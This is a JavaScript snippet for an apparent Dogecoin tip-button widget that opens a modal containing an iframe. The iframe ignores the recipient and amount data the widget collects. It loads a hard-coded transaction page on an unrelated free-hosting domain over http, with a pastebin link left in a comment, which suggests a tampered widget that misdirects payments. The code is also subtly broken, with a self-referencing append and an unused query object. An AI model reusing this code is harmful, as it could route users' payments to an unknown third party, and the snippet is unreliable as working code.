var scripter = document.createElement('script');
scripter.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js';
scripter.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(scripter);
window.onload = function () {
    var h = false;
    $(document).ready(function () {
        var b = $('head').append(b);
		var c = document.getElementById('tippin-button');
        var d = c.dataset;
        c.innerHTML = "http:// e-cpf.com";
        c.className += 'button-filled';
        var e = document.createElement('div');
        e.className += 'modal-tippin-container';
        e.innerHTML = '<div class="modal-tippin-content"><span class="close-button">&times;</span></div>';
        document.getElementsByTagName('body')[0].appendChild(e);
        var f = document.getElementsByClassName('modal-tippin-content').item(0);
        var g = document.getElementsByClassName('close-button').item(0);
        function toggleModal() {
            e.classList.toggle("show-modal-tippin")
        }
        function windowOnClick(a) {
            if (a.target === e) { toggleModal() }
        } g.addEventListener("click", toggleModal);
        window.addEventListener("click", windowOnClick);
        c.addEventListener("click", function () {
            if (h == false) {
                var a = createIframeElement(d);
                f.appendChild(a);
                h = true
            } toggleModal()
        })
    }); function createIframeElement(attributes = {}) {
        const iframe = document.createElement('iframe');
        iframe.style.border = 'none';
        iframe.style.width = '350px';
        iframe.style.height = '530px';
        iframe.style.marginLeft = '25px';
        iframe.scrolling = 'no';
        const query = { to: attributes.dest, amt: attributes.amount, ccy: attributes.currency, lbl: attributes.label, opd: attributes.opReturn };
        iframe.src = 'http://eubrasil.html-5.me/+/files/HTMLs/trx-doge.php'; return iframe // https://pastebin.com/raw/2t17wP4e' + attributes.dest
    }
}